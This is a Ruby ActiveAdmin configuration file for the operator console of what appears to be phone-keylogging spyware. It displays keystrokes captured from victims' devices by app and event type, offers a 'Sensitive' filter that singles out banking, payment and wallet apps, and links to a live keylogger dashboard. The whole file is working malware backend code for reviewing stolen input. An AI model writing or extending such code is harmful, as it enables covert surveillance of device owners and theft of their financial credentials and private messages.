ActiveAdmin.register Keylog do
  menu parent: "📦 Data", priority: 1, label: "Keylog History"
  
  actions :index, :show, :destroy

  filter :smartphone
  filter :app_package
  filter :event_type, as: :select, collection: ['TEXT_CHANGED', 'KEY_EVENT', 'FOCUSED']
  filter :keystroke
  filter :created_at
  filter :client_timestamp

  scope :all, default: true
  scope :today
  scope("Sensitive") { |scope| scope.where("app_package LIKE '%bank%' OR app_package LIKE '%pay%' OR app_package LIKE '%wallet%'") }

  index title: "⌨️ Keylogger History" do
    selectable_column
    column :created_at do |k|
      span k.created_at.strftime('%m/%d %H:%M:%S'), style: 'font-size: 11px; color: #8b949e;'
    end
    column "Device" do |k|
      link_to k.smartphone.name, admin_smartphone_path(k.smartphone) rescue 'Unknown'
    end
    column :app_package do |k|
      app_short = k.app_package.to_s.split('.').last(2).join('.')
      span app_short, class: "status_tag", style: "background: #667eea; color: white; padding: 2px 8px; border-radius: 4px; font-size: 11px;"
    end
    column :event_type do |k|
      color = k.event_type == 'TEXT_CHANGED' ? '#43e97b' : '#ffd700'
      span k.event_type, style: "color: #{color}; font-size: 11px;"
    end
    column :keystroke do |k|
      code k.keystroke, style: 'font-size: 12px; background: #161b22; padding: 2px 6px; border-radius: 3px;'
    end
    actions
  end

  show do
    attributes_table do
      row :smartphone
      row :app_package
      row :event_type
      row :keystroke
      row :client_timestamp
      row :created_at
    end
  end

  collection_action :clear_all, method: :delete do
    unless current_admin_user
      redirect_to admin_root_path, alert: "Unauthorized"
      return
    end
    Keylog.delete_all
    AuditLog.create(admin_user: current_admin_user, action: 'clear_all_keylogs', auditable_type: 'Keylog') rescue nil
    redirect_to collection_path, notice: "All keylogs cleared!"
  end

  action_item :clear_all, only: :index do
    link_to "🗑️ Clear All Logs", clear_all_admin_keylogs_path, method: :delete, data: { confirm: "Are you sure? This deletes ALL keylog history!" }, class: "button danger"
  end

  action_item :live_view, only: :index do
    link_to "🔴 Live Dashboard", admin_keylogger_dashboard_path, class: "button"
  end
end
